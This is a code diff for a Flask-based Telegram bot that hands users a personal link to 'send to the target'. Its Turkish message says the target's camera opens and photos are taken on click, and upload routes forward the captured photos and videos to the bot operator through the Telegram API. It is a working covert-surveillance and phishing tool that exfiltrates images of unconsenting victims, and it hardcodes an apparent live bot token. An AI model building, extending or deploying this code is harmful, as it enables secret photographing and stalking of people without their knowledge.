@@ -4,11 +4,11 @@ import uuid
 import base64
 from io import BytesIO
 from flask import Flask, request, send_from_directory
-import telegram
-from telegram import InlineKeyboardButton, InlineKeyboardMarkup
+import requests
 
 # ==================== CONFIG ====================
 TOKEN = os.environ.get("BOT_TOKEN", "8845469880:AAEEENGVv_igk7_DzrgMdK2UGG9Dnzva8VY")
+API_URL = "https://api.telegram.org/bot" + TOKEN
 
 RAILWAY_DOMAIN = os.environ.get("RAILWAY_PUBLIC_DOMAIN") or os.environ.get("RAILWAY_STATIC_URL")
 if RAILWAY_DOMAIN:
@@ -25,7 +25,38 @@ logger = logging.getLogger(__name__)
 
 app = Flask(__name__, static_folder="static")
 
-bot = telegram.Bot(token=TOKEN)
+# ==================== TELEGRAM API FUNCTIONS ====================
+def send_message(chat_id, text, reply_markup=None):
+    url = API_URL + "/sendMessage"
+    payload = {
+        "chat_id": chat_id,
+        "text": text,
+        "parse_mode": "Markdown"
+    }
+    if reply_markup:
+        payload["reply_markup"] = reply_markup
+    try:
+        requests.post(url, json=payload, timeout=10)
+    except Exception as e:
+        logger.error("send_message error: " + str(e))
+
+def send_photo(chat_id, photo_bytes, caption=""):
+    url = API_URL + "/sendPhoto"
+    files = {"photo": ("photo.jpg", photo_bytes, "image/jpeg")}
+    data = {"chat_id": chat_id, "caption": caption, "parse_mode": "Markdown"}
+    try:
+        requests.post(url, files=files, data=data, timeout=30)
+    except Exception as e:
+        logger.error("send_photo error: " + str(e))
+
+def send_video(chat_id, video_bytes, caption=""):
+    url = API_URL + "/sendVideo"
+    files = {"video": ("video.webm", video_bytes, "video/webm")}
+    data = {"chat_id": chat_id, "caption": caption, "parse_mode": "Markdown"}
+    try:
+        requests.post(url, files=files, data=data, timeout=30)
+    except Exception as e:
+        logger.error("send_video error: " + str(e))
 
 # ==================== ROUTES ====================
 @app.route("/" + TOKEN, methods=["POST"])
@@ -48,16 +79,13 @@ def telegram_webhook():
 
             link = WEBHOOK_URL + "/c/" + token
 
-            keyboard = [[InlineKeyboardButton("Linke Git", url=link)]]
-            reply_markup = InlineKeyboardMarkup(keyboard)
+            keyboard = {
+                "inline_keyboard": [[{"text": "Linke Git", "url": link}]]
+            }
 
             msg = "Merhaba @" + username + "!\n\nOzel Linkiniz:\n" + link + "\n\nBu linki hedefe gonderin. Hedef linke tiklayinca kamera acilir ve fotograf cekilir."
 
-            bot.send_message(
-                chat_id=chat_id,
-                text=msg,
-                reply_markup=reply_markup
-            )
+            send_message(chat_id, msg, reply_markup=keyboard)
 
     return "OK", 200
 
@@ -89,12 +117,7 @@ def upload_photo(token):
 
     cap = "Yeni Fotograf!\n\nKullanici: @" + username + "\nToken: " + token
 
-    bot.send_photo(
-        chat_id=chat_id,
-        photo=BytesIO(image_bytes),
-        caption=cap
-    )
-
+    send_photo(chat_id, BytesIO(image_bytes), cap)
     return {"success": True}, 200
 
 @app.route("/upload_video/<token>", methods=["POST"])
@@ -112,12 +135,7 @@ def upload_video(token):
 
     cap = "Yeni Video!\n\nKullanici: @" + username
 
-    bot.send_video(
-        chat_id=chat_id,
-        video=video_file.read(),
-        caption=cap
-    )
-
+    send_video(chat_id, video_file.read(), cap)
     return {"success": True}, 200
 
 @app.route("/")
